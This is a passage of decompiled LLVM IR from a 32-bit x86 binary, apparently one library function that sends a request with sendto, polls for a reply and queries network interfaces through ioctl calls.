  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_8062505 = add i32 %tmp111, 8
  %v2_8062505 = inttoptr i32 %v1_8062505 to i32*
  %v3_8062505 = load i32, i32* %v2_8062505, align 4
  store i32 %v3_8062505, i32* @esi, align 4
  %v2_8062508 = add i32 %v3_8062505, 28
  %v3_8062508 = inttoptr i32 %v2_8062508 to i32*
  %v4_8062508 = load i32, i32* %v3_8062508, align 4
  %v6_8062508 = mul i32 %v4_8062508, 1000
  store i32 %v6_8062508, i32* %ecx.global-to-local, align 4
  %v1_806250f = add i32 %v3_8062505, 32
  %v2_806250f = inttoptr i32 %v1_806250f to i32*
  %v3_806250f = load i32, i32* %v2_806250f, align 4
  %v1_8062512 = ashr i32 %v3_806250f, 31
  %v2_8062513 = zext i32 %v3_806250f to i64
  %v4_8062513 = zext i32 %v1_8062512 to i64
  %v5_8062513 = mul nuw i64 %v4_8062513, 4294967296
  %v6_8062513 = or i64 %v5_8062513, %v2_8062513
  %v8_8062513 = sdiv i64 %v6_8062513, 1000
  %v9_8062513 = trunc i64 %v8_8062513 to i32
  store i32 %v9_8062513, i32* %eax.global-to-local, align 4
  %v10_8062513 = srem i64 %v6_8062513, 1000
  %v11_8062513 = trunc i64 %v10_8062513 to i32
  store i32 %v11_8062513, i32* %edx.global-to-local, align 4
  %v2_8062515 = add i32 %v9_8062513, %v6_8062508
  store i32 %v2_8062515, i32* %ecx.global-to-local, align 4
  %v1_806251d = add i32 %v3_8062505, 40
  %v2_806251d = inttoptr i32 %v1_806251d to i32*
  %v3_806251d = load i32, i32* %v2_806251d, align 4
  %v13_806251d = icmp eq i32 %v3_806251d, -1
  %v1_8062521 = icmp eq i1 %v13_806251d, false
  br i1 %v1_8062521, label %dec_label_pc_806255a, label %dec_label_pc_8062523

dec_label_pc_8062523:                             ; preds = %entry
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806256c

dec_label_pc_8062537:                             ; preds = %dec_label_pc_8062639
  %v1_8062537 = call i32 @__errno_location(i32 %storemerge3)
  store i32 %v1_8062537, i32* %eax.global-to-local, align 4
  %v1_806253c = inttoptr i32 %v1_8062537 to i32*
  %v2_806253c = load i32, i32* %v1_806253c, align 4
  store i32 %v2_806253c, i32* %eax.global-to-local, align 4
  %v0_806253e = load i32, i32* @esi, align 4
  %v1_806253e = add i32 %v0_806253e, 44
  %v2_806253e = inttoptr i32 %v1_806253e to i32*
  store i32 3, i32* %v2_806253e, align 4
  %v0_8062545 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062545 = load i32, i32* @esi, align 4
  %v2_8062545 = add i32 %v1_8062545, 48
  %v3_8062545 = inttoptr i32 %v2_8062545 to i32*
  store i32 %v0_8062545, i32* %v3_8062545, align 4
  store i32 3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062a43

dec_label_pc_8062552:                             ; preds = %dec_label_pc_80628f1
  %v1_8062552 = add i32 %v0_8062552, 12
  %v2_8062552 = inttoptr i32 %v1_8062552 to i32*
  %v3_8062552 = load i32, i32* %v2_8062552, align 4
  store i32 %v3_8062552, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062955

dec_label_pc_806255a:                             ; preds = %entry
  store i32 %v3_806251d, i32* %ecx.global-to-local, align 4
  %v1_8062563 = add i32 %v3_8062505, 36
  %v2_8062563 = inttoptr i32 %v1_8062563 to i32*
  %v3_8062563 = load i32, i32* %v2_8062563, align 4
  store i32 %v3_8062563, i32* @ebx, align 4
  br label %dec_label_pc_806256c

dec_label_pc_806256c:                             ; preds = %dec_label_pc_8062523, %dec_label_pc_806255a
  %stack_var_-9000.0 = phi i32 [ %v3_806251d, %dec_label_pc_806255a ], [ %arg7, %dec_label_pc_8062523 ]
  %storemerge3 = phi i32 [ %v3_8062563, %dec_label_pc_806255a ], [ %arg6, %dec_label_pc_8062523 ]
  %v4_806259d = icmp eq i32 %arg2, 0
  %v2_8062679 = ptrtoint i32* %stack_var_-168 to i32
  %v2_80626ae = ptrtoint i32* %stack_var_-28 to i32
  %v4_80627e7 = and i8 %tmp88, 8
  %v5_80627e7 = icmp eq i8 %v4_80627e7, 0
  %v2_8062911 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8062916 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8062814 = ptrtoint i16* %stack_var_-76 to i32
  %v2_806281d = ptrtoint i32* %stack_var_-36 to i32
  %v2_806282e = ptrtoint i32* %stack_var_-8980 to i32
  %v4_8062891 = and i8 %tmp80, 32
  %v5_8062891 = icmp eq i8 %v4_8062891, 0
  %v2_80628be = ptrtoint i32* %stack_var_-72 to i32
  %v4_80628ce = zext i16 %tmp79 to i32
  %v2_806298a = ptrtoint i32* %stack_var_-100 to i32
  %v2_8062994 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80626e5 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8062725 = ptrtoint i32* %stack_var_-132 to i32
  %v4_806274d = urem i8 %tmp89, 2
  %v5_806274d = icmp eq i8 %v4_806274d, 0
  %v4_8062663 = icmp eq i32 %storemerge3, 0
  %v4_806266c = icmp eq i32 %stack_var_-9000.0, 0
  %v2_80625c5 = ptrtoint i32* %stack_var_8 to i32
  %v1_806266a = icmp eq i1 %v4_8062663, false
  br label %dec_label_pc_8062594

dec_label_pc_8062594:                             ; preds = %dec_label_pc_8062a2e, %dec_label_pc_806256c
  %v1_806267f59 = phi i32 [ %v15_80624fa, %dec_label_pc_806256c ], [ %v1_8062a27, %dec_label_pc_8062a2e ]
  %v0_80625a7 = phi i32 [ %v3_8062505, %dec_label_pc_806256c ], [ %v0_8062594.pre, %dec_label_pc_8062a2e ]
  %stack_var_-9016.0 = phi i32 [ %tmp90, %dec_label_pc_806256c ], [ %stack_var_-9016.2, %dec_label_pc_8062a2e ]
  %stack_var_-9012.0 = phi i32 [ %tmp92, %dec_label_pc_806256c ], [ %stack_var_-9012.2, %dec_label_pc_8062a2e ]
  %stack_var_-9004.0 = phi i32 [ 0, %dec_label_pc_806256c ], [ %stack_var_-9004.2, %dec_label_pc_8062a2e ]
  %stack_var_-9008.0 = phi i32 [ 0, %dec_label_pc_806256c ], [ %stack_var_-9008.2, %dec_label_pc_8062a2e ]
  %stack_var_-9020.0 = phi i32 [ 2, %dec_label_pc_806256c ], [ %v4_8062a2e, %dec_label_pc_8062a2e ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_806256c ], [ %stack_var_-9028.2, %dec_label_pc_8062a2e ]
  %v1_8062594 = add i32 %v0_80625a7, 56
  store i32 %v1_8062594, i32* %eax.global-to-local, align 4
  br i1 %v4_806259d, label %dec_label_pc_8062679, label %dec_label_pc_80625df

dec_label_pc_80625df:                             ; preds = %dec_label_pc_8062594
  %v2_80625a7 = inttoptr i32 %v1_8062594 to i32*
  store i32 0, i32* %v2_80625a7, align 4
  %v1_80625ae = load i32, i32* @esp, align 4
  %v2_80625ae = add i32 %v1_80625ae, -4
  %v3_80625ae = inttoptr i32 %v2_80625ae to i32*
  store i32 %v2_8062994, i32* %v3_80625ae, align 4
  store i32 %v1_8062594, i32* %edx.global-to-local, align 4
  %v2_80625b5 = add i32 %v1_80625ae, -8
  %v3_80625b5 = inttoptr i32 %v2_80625b5 to i32*
  store i32 %v2_8062994, i32* %v3_80625b5, align 4
  %v0_80625b6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80625b6 = add i32 %v0_80625b6, 4
  %v2_80625b6 = inttoptr i32 %v1_80625b6 to i32*
  %v3_80625b6 = load i32, i32* %v2_80625b6, align 4
  store i32 %v3_80625b6, i32* %eax.global-to-local, align 4
  %v0_80625b9 = load i32, i32* @esi, align 4
  %v1_80625b9 = add i32 %v0_80625b9, 80
  %v2_80625b9 = inttoptr i32 %v1_80625b9 to i32*
  %v3_80625b9 = load i32, i32* %v2_80625b9, align 4
  %v5_80625b9 = add i32 %v1_80625ae, -12
  %v6_80625b9 = inttoptr i32 %v5_80625b9 to i32*
  store i32 %v3_80625b9, i32* %v6_80625b9, align 4
  %v0_80625bc = load i32, i32* %edx.global-to-local, align 4
  %v2_80625bc = add i32 %v1_80625ae, -16
  %v3_80625bc = inttoptr i32 %v2_80625bc to i32*
  store i32 %v0_80625bc, i32* %v3_80625bc, align 4
  %v1_80625bd = add i32 %v1_80625ae, -20
  %v2_80625bd = inttoptr i32 %v1_80625bd to i32*
  store i32 134620608, i32* %v2_80625bd, align 4
  %v3_80625bd = load i32, i32* %eax.global-to-local, align 4
  %v4_80625bd = add i32 %v3_80625bd, 20
  %v5_80625bd = inttoptr i32 %v4_80625bd to i32*
  %v6_80625bd = load i32, i32* %v5_80625bd, align 4
  call void @__pseudo_call(i32 %v6_80625bd)
  %v0_80625c0 = load i32, i32* @esi, align 4
  %v1_80625c0 = add i32 %v0_80625c0, 88
  %v2_80625c0 = inttoptr i32 %v1_80625c0 to i32*
  %v3_80625c0 = load i32, i32* %v2_80625c0, align 4
  store i32 %v3_80625c0, i32* %eax.global-to-local, align 4
  %v1_80625c3 = inttoptr i32 %v3_80625c0 to i32*
  %v2_80625c3 = load i32, i32* %v1_80625c3, align 4
  %v3_80625c3 = add i32 %v2_80625c3, 1
  store i32 %v3_80625c3, i32* %v1_80625c3, align 4
  store i32 %v2_80625c5, i32* %eax.global-to-local, align 4
  %v0_80625c8 = load i32, i32* @esp, align 4
  %v1_80625c8 = inttoptr i32 %v0_80625c8 to i32*
  %v3_80625c8 = add i32 %v0_80625c8, 4
  store i32 %v1_8062594, i32* %ecx.global-to-local, align 4
  %v1_80625cf = inttoptr i32 %v3_80625c8 to i32*
  %v1_80625d0 = add i32 %v0_80625a7, 60
  %v2_80625d0 = inttoptr i32 %v1_80625d0 to i32*
  %v3_80625d0 = load i32, i32* %v2_80625d0, align 4
  store i32 %v3_80625d0, i32* %edx.global-to-local, align 4
  store i32 %v2_80625c5, i32* %v1_80625cf, align 4
  %v0_80625d4 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80625d4, i32* %v1_80625c8, align 4
  %v1_80625d5 = add i32 %v0_80625c8, -4
  %v2_80625d5 = inttoptr i32 %v1_80625d5 to i32*
  store i32 134620632, i32* %v2_80625d5, align 4
  %v3_80625d5 = load i32, i32* %edx.global-to-local, align 4
  %v4_80625d5 = add i32 %v3_80625d5, 4
  %v5_80625d5 = inttoptr i32 %v4_80625d5 to i32*
  %v6_80625d5 = load i32, i32* %v5_80625d5, align 4
  call void @__pseudo_call(i32 %v6_80625d5)
  %v0_80625d8 = load i32, i32* @esp, align 4
  store i32 %tmp111, i32* @ebx, align 4
  %v2_80625e2 = load i32, i32* %arg1, align 4
  store i32 %v2_80625e2, i32* %eax.global-to-local, align 4
  %v0_80625e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80625e4 = add i32 %v0_80625d8, 12
  %v3_80625e4 = inttoptr i32 %v2_80625e4 to i32*
  store i32 %v0_80625e4, i32* %v3_80625e4, align 4
  %v0_80625e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80625e5 = add i32 %v0_80625d8, 8
  %v3_80625e5 = inttoptr i32 %v2_80625e5 to i32*
  store i32 %v0_80625e5, i32* %v3_80625e5, align 4
  %v1_80625e6 = add i32 %v2_80625e2, 32
  %v2_80625e6 = inttoptr i32 %v1_80625e6 to i32*
  %v3_80625e6 = load i32, i32* %v2_80625e6, align 4
  store i32 %v3_80625e6, i32* %edx.global-to-local, align 4
  %v5_80625e9 = add i32 %v0_80625d8, 4
  %v6_80625e9 = inttoptr i32 %v5_80625e9 to i32*
  store i32 %v1_8062594, i32* %v6_80625e9, align 4
  %v3_80625ef = inttoptr i32 %v0_80625d8 to i32*
  store i32 %v2_80625e2, i32* %v3_80625ef, align 4
  %v1_80625f0 = add i32 %v0_80625d8, -4
  %v2_80625f0 = inttoptr i32 %v1_80625f0 to i32*
  store i32 134620659, i32* %v2_80625f0, align 4
  %v3_80625f0 = load i32, i32* %edx.global-to-local, align 4
  %v4_80625f0 = add i32 %v3_80625f0, 4
  %v5_80625f0 = inttoptr i32 %v4_80625f0 to i32*
  %v6_80625f0 = load i32, i32* %v5_80625f0, align 4
  call void @__pseudo_call(i32 %v6_80625f0)
  %v0_80625f3 = load i32, i32* @esp, align 4
  %v1_80625f6 = icmp eq i32 %v2_80625e2, 0
  br i1 %v1_80625f6, label %dec_label_pc_806260f, label %dec_label_pc_8062620

dec_label_pc_806260f:                             ; preds = %dec_label_pc_80625df
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_8062614 = load i32, i32* @esi, align 4
  %v1_8062614 = add i32 %v0_8062614, 44
  %v2_8062614 = inttoptr i32 %v1_8062614 to i32*
  store i32 1, i32* %v2_8062614, align 4
  br label %dec_label_pc_8062a43

dec_label_pc_8062620:                             ; preds = %dec_label_pc_80625df
  %v2_80625fa = add i32 %v0_80625f3, 12
  %v3_80625fa = inttoptr i32 %v2_80625fa to i32*
  store i32 %v2_80625e2, i32* %v3_80625fa, align 4
  %v2_80625fb = add i32 %v0_80625f3, 8
  %v3_80625fb = inttoptr i32 %v2_80625fb to i32*
  store i32 %v2_80625e2, i32* %v3_80625fb, align 4
  %v5_80625fc = add i32 %v0_80625f3, 4
  %v6_80625fc = inttoptr i32 %v5_80625fc to i32*
  store i32 %arg3, i32* %v6_80625fc, align 4
  %v6_80625ff = inttoptr i32 %v0_80625f3 to i32*
  store i32 %v1_8062594, i32* %v6_80625ff, align 4
  %v1_8062605 = add i32 %v0_80625f3, -4
  %v2_8062605 = inttoptr i32 %v1_8062605 to i32*
  store i32 134620680, i32* %v2_8062605, align 4
  call void @__pseudo_call(i32 %arg2)
  %v0_8062608 = load i32, i32* @esp, align 4
  store i32 %v1_8062594, i32* %edx.global-to-local, align 4
  %v3_8062629 = load i32, i32* %v2_80625d0, align 4
  store i32 %v3_8062629, i32* %eax.global-to-local, align 4
  %v3_806262c = inttoptr i32 %v0_8062608 to i32*
  store i32 %v1_8062594, i32* %v3_806262c, align 4
  %v1_806262d = add i32 %v0_8062608, -4
  %v2_806262d = inttoptr i32 %v1_806262d to i32*
  store i32 134620720, i32* %v2_806262d, align 4
  %v3_806262d = load i32, i32* %eax.global-to-local, align 4
  %v4_806262d = add i32 %v3_806262d, 16
  %v5_806262d = inttoptr i32 %v4_806262d to i32*
  %v6_806262d = load i32, i32* %v5_806262d, align 4
  call void @__pseudo_call(i32 %v6_806262d)
  %v0_8062630 = load i32, i32* @esp, align 4
  %v1_8062630 = add i32 %v0_8062630, 16
  %v0_8062633 = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062639

dec_label_pc_8062639:                             ; preds = %dec_label_pc_80627b5, %dec_label_pc_80627a1, %dec_label_pc_8062620
  %v1_8062639 = phi i32 [ %v1_8062742, %dec_label_pc_80627a1 ], [ %v1_8062742, %dec_label_pc_80627b5 ], [ %v1_8062630, %dec_label_pc_8062620 ]
  %stack_var_-9016.1 = phi i32 [ %stack_var_-9016.3161, %dec_label_pc_80627a1 ], [ %stack_var_-9016.3161, %dec_label_pc_80627b5 ], [ %stack_var_-9016.0, %dec_label_pc_8062620 ]
  %stack_var_-9012.1 = phi i32 [ %v0_80626d6, %dec_label_pc_80627a1 ], [ %v0_80626d6, %dec_label_pc_80627b5 ], [ %stack_var_-9012.0, %dec_label_pc_8062620 ]
  %stack_var_-9004.1 = phi i32 [ %stack_var_-9004.3.lcssa, %dec_label_pc_80627a1 ], [ %stack_var_-9004.3.lcssa, %dec_label_pc_80627b5 ], [ %stack_var_-9004.0, %dec_label_pc_8062620 ]
  %stack_var_-9008.1 = phi i32 [ %storemerge7.in.lcssa, %dec_label_pc_80627a1 ], [ %storemerge7.in.lcssa, %dec_label_pc_80627b5 ], [ %stack_var_-9008.0, %dec_label_pc_8062620 ]
  %stack_var_-9028.1 = phi i32 [ %stack_var_-9028.2, %dec_label_pc_80627a1 ], [ %stack_var_-9028.2, %dec_label_pc_80627b5 ], [ %v0_8062633, %dec_label_pc_8062620 ]
  %v0_8062639 = load i32, i32* @edi, align 4
  %v2_8062639 = add i32 %v1_8062639, -4
  %v3_8062639 = inttoptr i32 %v2_8062639 to i32*
  store i32 %v0_8062639, i32* %v3_8062639, align 4
  %v0_806263a = load i32, i32* @edi, align 4
  %v2_806263a = add i32 %v1_8062639, -8
  %v3_806263a = inttoptr i32 %v2_806263a to i32*
  store i32 %v0_806263a, i32* %v3_806263a, align 4
  %v0_806263b = load i32, i32* @esi, align 4
  %v1_806263b = add i32 %v0_806263b, 24
  %v2_806263b = inttoptr i32 %v1_806263b to i32*
  %v3_806263b = load i32, i32* %v2_806263b, align 4
  %v5_806263b = add i32 %v1_8062639, -12
  %v6_806263b = inttoptr i32 %v5_806263b to i32*
  store i32 %v3_806263b, i32* %v6_806263b, align 4
  %v0_806263e = load i32, i32* @esi, align 4
  %v1_806263e = add i32 %v0_806263e, 8
  store i32 %v1_806263e, i32* %eax.global-to-local, align 4
  %v2_8062641 = add i32 %v1_8062639, -16
  %v3_8062641 = inttoptr i32 %v2_8062641 to i32*
  store i32 %v1_806263e, i32* %v3_8062641, align 4
  %v1_8062642 = add i32 %v1_8062639, -20
  %v2_8062642 = inttoptr i32 %v1_8062642 to i32*
  store i32 0, i32* %v2_8062642, align 4
  %v5_8062644 = add i32 %v1_8062639, -24
  %v6_8062644 = inttoptr i32 %v5_8062644 to i32*
  store i32 %stack_var_-9028.1, i32* %v6_8062644, align 4
  %v0_806264a = load i32, i32* @esi, align 4
  %v1_806264a = add i32 %v0_806264a, 88
  %v2_806264a = inttoptr i32 %v1_806264a to i32*
  %v3_806264a = load i32, i32* %v2_806264a, align 4
  %v5_806264a = add i32 %v1_8062639, -28
  %v6_806264a = inttoptr i32 %v5_806264a to i32*
  store i32 %v3_806264a, i32* %v6_806264a, align 4
  %v0_806264d = load i32, i32* @esi, align 4
  %v1_806264d = inttoptr i32 %v0_806264d to i32*
  %v2_806264d = load i32, i32* %v1_806264d, align 4
  %v4_806264d = add i32 %v1_8062639, -32
  %v5_806264d = inttoptr i32 %v4_806264d to i32*
  store i32 %v2_806264d, i32* %v5_806264d, align 4
  %v6_806264f = call i32 @__libc_sendto(i32 %stack_var_-9028.1, i32 %v2_8062515, i32 %stack_var_-9020.0, i32 %stack_var_-9016.1, i32 %stack_var_-9012.1, i32 %stack_var_-9008.1)
  store i32 %v6_806264f, i32* %eax.global-to-local, align 4
  %v0_8062654 = load i32, i32* @esp, align 4
  %v1_8062654 = add i32 %v0_8062654, 32
  %v15_8062657 = icmp eq i32 %v6_806264f, %stack_var_-9028.1
  %v1_806265d = icmp eq i1 %v15_8062657, false
  br i1 %v1_806265d, label %dec_label_pc_8062537, label %dec_label_pc_8062663

dec_label_pc_8062663:                             ; preds = %dec_label_pc_8062639
  br i1 %v1_806266a, label %dec_label_pc_8062679, label %dec_label_pc_806266c

dec_label_pc_806266c:                             ; preds = %dec_label_pc_8062663
  br i1 %v4_806266c, label %dec_label_pc_806266c.dec_label_pc_80627c7_crit_edge, label %dec_label_pc_8062679

dec_label_pc_806266c.dec_label_pc_80627c7_crit_edge: ; preds = %dec_label_pc_806266c
  %v0_80627cc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80627c7

dec_label_pc_8062679:                             ; preds = %dec_label_pc_806266c, %dec_label_pc_8062663, %dec_label_pc_8062594
  %v1_806267f = phi i32 [ %v1_806267f59, %dec_label_pc_8062594 ], [ %v1_8062654, %dec_label_pc_8062663 ], [ %v1_8062654, %dec_label_pc_806266c ]
  %stack_var_-9016.2 = phi i32 [ %stack_var_-9016.0, %dec_label_pc_8062594 ], [ %stack_var_-9016.1, %dec_label_pc_8062663 ], [ %stack_var_-9016.1, %dec_label_pc_806266c ]
  %stack_var_-9012.2 = phi i32 [ %stack_var_-9012.0, %dec_label_pc_8062594 ], [ %stack_var_-9012.1, %dec_label_pc_8062663 ], [ %stack_var_-9012.1, %dec_label_pc_806266c ]
  %stack_var_-9004.2 = phi i32 [ %stack_var_-9004.0, %dec_label_pc_8062594 ], [ %stack_var_-9004.1, %dec_label_pc_8062663 ], [ %stack_var_-9004.1, %dec_label_pc_806266c ]
  %stack_var_-9008.2 = phi i32 [ %stack_var_-9008.0, %dec_label_pc_8062594 ], [ %stack_var_-9008.1, %dec_label_pc_8062663 ], [ %stack_var_-9008.1, %dec_label_pc_806266c ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_8062594 ], [ %stack_var_-9028.1, %dec_label_pc_8062663 ], [ %stack_var_-9028.1, %dec_label_pc_806266c ]
  store i32 %v2_8062679, i32* %eax.global-to-local, align 4
  %v0_806267f = load i32, i32* @ebx, align 4
  %v2_806267f = add i32 %v1_806267f, -4
  %v3_806267f = inttoptr i32 %v2_806267f to i32*
  store i32 %v0_806267f, i32* %v3_806267f, align 4
  %v1_8062680 = add i32 %v1_806267f, -8
  %v2_8062680 = inttoptr i32 %v1_8062680 to i32*
  store i32 12, i32* %v2_8062680, align 4
  %v1_8062682 = add i32 %v1_806267f, -12
  %v2_8062682 = inttoptr i32 %v1_8062682 to i32*
  store i32 ptrtoint (i32* @global_var_807ea20.795 to i32), i32* %v2_8062682, align 4
  %v2_8062687 = add i32 %v1_806267f, -16
  %v3_8062687 = inttoptr i32 %v2_8062687 to i32*
  store i32 %v2_8062679, i32* %v3_8062687, align 4
  %v3_8062688 = inttoptr i32 %stack_var_-9028.2 to i16*
  %v4_8062688 = call i32 @memcpy(i16* %v3_8062688, i32 %v2_8062515, i32 %stack_var_-9020.0)
  store i32 %v4_8062688, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v0_806269f = load i32, i32* @esi, align 4
  %v1_806269f = inttoptr i32 %v0_806269f to i32*
  %v2_806269f = load i32, i32* %v1_806269f, align 4
  store i32 %v2_806269f, i32* %eax.global-to-local, align 4
  %v0_80626a1 = load i32, i32* @esp, align 4
  %v1_80626a1 = add i32 %v0_80626a1, 16
  store i32 %v2_806269f, i32* %stack_var_-28, align 4
  %v1_80627fd = add i32 %stack_var_-9028.2, 286
  %v1_8062805 = and i32 %v1_80627fd, -16
  br label %dec_label_pc_80626ad

dec_label_pc_80626ad:                             ; preds = %dec_label_pc_8062969, %dec_label_pc_8062978, %dec_label_pc_806294f.dec_label_pc_80626ad.backedge_crit_edge, %dec_label_pc_8062679
  %v1_80626ad = phi i32 [ %v1_80626a1, %dec_label_pc_8062679 ], [ %v1_80626ad.pre.pre, %dec_label_pc_806294f.dec_label_pc_80626ad.backedge_crit_edge ], [ %v1_8062932, %dec_label_pc_8062978 ], [ %v1_8062932, %dec_label_pc_8062969 ]
  %v0_80626ad = phi i32 [ %arg5, %dec_label_pc_8062679 ], [ %v0_80626ad.pre.pre, %dec_label_pc_806294f.dec_label_pc_80626ad.backedge_crit_edge ], [ %v6_806292d, %dec_label_pc_8062978 ], [ %v6_806292d, %dec_label_pc_8062969 ]
  %v2_80626ad = add i32 %v1_80626ad, -4
  %v3_80626ad = inttoptr i32 %v2_80626ad to i32*
  store i32 %v0_80626ad, i32* %v3_80626ad, align 4
  store i32 %v2_80626ae, i32* %eax.global-to-local, align 4
  %v5_80626b1 = add i32 %v1_80626ad, -8
  %v6_80626b1 = inttoptr i32 %v5_80626b1 to i32*
  store i32 %v2_8062515, i32* %v6_80626b1, align 4
  %v1_80626b7 = add i32 %v1_80626ad, -12
  %v2_80626b7 = inttoptr i32 %v1_80626b7 to i32*
  store i32 1, i32* %v2_80626b7, align 4
  %v2_80626b9 = add i32 %v1_80626ad, -16
  %v3_80626b9 = inttoptr i32 %v2_80626b9 to i32*
  store i32 %v2_80626ae, i32* %v3_80626b9, align 4
  %v1_80626ba = load i32, i32* %stack_var_-20, align 4
  %v5_80626ba = call i32 @__libc_poll(%pollfd* inttoptr (i32 1 to %pollfd*), i32 %v1_80626ba, i32 %v0_80624f9)
  store i32 %v5_80626ba, i32* %eax.global-to-local, align 4
  %v0_80626bf = load i32, i32* @esp, align 4
  %v1_80626bf = add i32 %v0_80626bf, 16
  %v10_80626c2 = icmp eq i32 %v5_80626ba, -1
  br i1 %v10_80626c2, label %dec_label_pc_80627d8, label %dec_label_pc_80626cb

dec_label_pc_80626cb:                             ; preds = %dec_label_pc_80626ad
  %v1_80626cb = icmp eq i32 %v5_80626ba, 0
  %v1_80626cd = icmp eq i1 %v1_80626cb, false
  br i1 %v1_80626cd, label %dec_label_pc_80627e7, label %dec_label_pc_80626d3

dec_label_pc_80626d3:                             ; preds = %dec_label_pc_80626cb
  %v0_80626d3 = load i32, i32* @esi, align 4
  %v1_80626d3 = inttoptr i32 %v0_80626d3 to i32*
  %v2_80626d3 = load i32, i32* %v1_80626d3, align 4
  store i32 %v2_80626d3, i32* %eax.global-to-local, align 4
  %v0_80626d5 = load i32, i32* @edx, align 4
  %v2_80626d5 = add i32 %v0_80626bf, 12
  %v3_80626d5 = inttoptr i32 %v2_80626d5 to i32*
  store i32 %v0_80626d5, i32* %v3_80626d5, align 4
  %v0_80626d6 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_80626e5, i32* %eax.global-to-local, align 4
  %v2_80626e8 = add i32 %v0_80626bf, 8
  %v3_80626e8 = inttoptr i32 %v2_80626e8 to i32*
  store i32 %v2_80626e5, i32* %v3_80626e8, align 4
  %v1_80626e9 = add i32 %v0_80626bf, 4
  %v2_80626e9 = inttoptr i32 %v1_80626e9 to i32*
  store i32 35090, i32* %v2_80626e9, align 4
  %v6_80626ee = inttoptr i32 %v0_80626bf to i32*
  store i32 %v0_80626d6, i32* %v6_80626ee, align 4
  store i32 8800, i32* %stack_var_-44, align 4
  %v3_80626fb = call i32 @ioctl(i32 %v0_80626d6, i32 %stack_var_-9008.2, i32 %stack_var_-9004.2)
  store i32 %v3_80626fb, i32* %eax.global-to-local, align 4
  %v1_8062703 = icmp eq i32 %v3_80626fb, 0
  %v1_8062705 = icmp eq i1 %v1_8062703, false
  br i1 %v1_8062705, label %dec_label_pc_8062958, label %dec_label_pc_806270b

dec_label_pc_806270b:                             ; preds = %dec_label_pc_80626d3
  %v0_8062700 = load i32, i32* @esp, align 4
  %v1_8062700 = add i32 %v0_8062700, 16
  %v3_806270b = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_806282e, i32* %edx.global-to-local, align 4
  %v2_8062711 = udiv i32 %v3_806270b, 32
  %tmp200 = icmp ult i32 %v3_806270b, 32
  store i32 %v2_8062711, i32* @edi, align 4
  %tmp132158 = icmp eq i1 %tmp200, false
  br i1 %tmp132158, label %dec_label_pc_806271c, label %dec_label_pc_8062958

dec_label_pc_806271c:                             ; preds = %dec_label_pc_806270b, %dec_label_pc_8062760
  %stack_var_-9016.3161 = phi i32 [ %v4_8062760, %dec_label_pc_8062760 ], [ %v2_806282e, %dec_label_pc_806270b ]
  %v0_806271c160 = phi i32 [ %v3_806273d, %dec_label_pc_8062760 ], [ %v3_80626fb, %dec_label_pc_806270b ]
  %v1_806271c159 = phi i32 [ %v1_8062742, %dec_label_pc_8062760 ], [ %v1_8062700, %dec_label_pc_806270b ]
  %v2_806271c = add i32 %v1_806271c159, -4
  %v3_806271c = inttoptr i32 %v2_806271c to i32*
  store i32 %v0_806271c160, i32* %v3_806271c, align 4
  %v1_806271d = add i32 %v1_806271c159, -8
  %v2_806271d = inttoptr i32 %v1_806271d to i32*
  store i32 32, i32* %v2_806271d, align 4
  %v5_806271f = add i32 %v1_806271c159, -12
  %v6_806271f = inttoptr i32 %v5_806271f to i32*
  store i32 %stack_var_-9016.3161, i32* %v6_806271f, align 4
  store i32 %v2_8062725, i32* @ebx, align 4
  %v2_8062728 = add i32 %v1_806271c159, -16
  %v3_8062728 = inttoptr i32 %v2_8062728 to i32*
  store i32 %v2_8062725, i32* %v3_8062728, align 4
  %v3_8062729 = inttoptr i32 %stack_var_-9016.3161 to i16*
  %v4_8062729 = call i32 @memcpy(i16* %v3_8062729, i32 %v0_80626d6, i32 %stack_var_-9008.2)
  store i32 %v4_8062729, i32* %eax.global-to-local, align 4
  %v0_806272e = load i32, i32* @esp, align 4
  %v2_8062731 = add i32 %v0_806272e, 8
  %v3_8062731 = inttoptr i32 %v2_8062731 to i32*
  store i32 %v2_8062725, i32* %v3_8062731, align 4
  %v1_8062732 = add i32 %v0_806272e, 4
  %v2_8062732 = inttoptr i32 %v1_8062732 to i32*
  store i32 35091, i32* %v2_8062732, align 4
  %v6_8062737 = inttoptr i32 %v0_806272e to i32*
  store i32 %v0_80626d6, i32* %v6_8062737, align 4
  %v3_806273d = call i32 @ioctl(i32 %stack_var_-9016.3161, i32 %v0_80626d6, i32 %stack_var_-9008.2)
  store i32 %v3_806273d, i32* %eax.global-to-local, align 4
  %v0_8062742 = load i32, i32* @esp, align 4
  %v1_8062742 = add i32 %v0_8062742, 16
  %v2_8062745 = icmp slt i32 %v3_806273d, 0
  br i1 %v2_8062745, label %dec_label_pc_8062958, label %dec_label_pc_806274d

dec_label_pc_806274d:                             ; preds = %dec_label_pc_806271c
  br i1 %v5_806274d, label %dec_label_pc_8062760, label %dec_label_pc_8062753

dec_label_pc_8062753:                             ; preds = %dec_label_pc_806274d
  store i32 %stack_var_-9016.3161, i32* %ecx.global-to-local, align 4
  %v1_8062759 = add i32 %stack_var_-9016.3161, 16
  %v2_8062759 = inttoptr i32 %v1_8062759 to i16*
  %v3_8062759 = load i16, i16* %v2_8062759, align 4
  %v12_8062759 = icmp eq i16 %v3_8062759, 2
  br i1 %v12_8062759, label %dec_label_pc_8062771, label %dec_label_pc_8062760

